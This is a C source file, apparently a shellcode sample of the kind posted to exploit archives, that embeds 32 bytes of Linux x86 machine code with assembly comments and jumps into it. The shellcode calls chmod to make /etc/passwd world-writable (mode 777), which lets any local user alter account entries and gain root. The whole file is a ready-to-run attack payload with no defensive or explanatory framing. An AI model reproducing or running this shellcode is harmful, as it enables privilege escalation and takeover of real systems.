/*
chmod 777 /etc/passwd (32 bytes)
Author: MMxM  (@hc0d3r)
Sáb Mai  2 17:06:20 BRT 2015
*/

#include <stdio.h>
#include <string.h>

unsigned const char sc[] =
	"\x31\xc0"	//xor    %eax,%eax
	"\x31\xc9"	//xor    %ecx,%ecx
	"\x68\x73\x77\x64\x78"	//push   $0x78647773
	"\x68\x2f\x70\x61\x73"	//push   $0x7361702f
	"\x68\x2f\x65\x74\x63"	//push   $0x6374652f
	"\x66\xb9\xff\x01"	//mov    $0x1ff,%cx
	"\x89\xe3"	//mov    %esp,%ebx
	"\x88\x43\x0b"	//mov    %al,0xb(%ebx)
	"\xb0\x0f"	//mov    $0xf,%al
	"\xcd\x80"	//int    $0x80
;

int main(void){
	printf("Shellcode lenght: %d bytes\n", strlen(sc));
	__asm__ ("jmp sc");
	return 0;
}

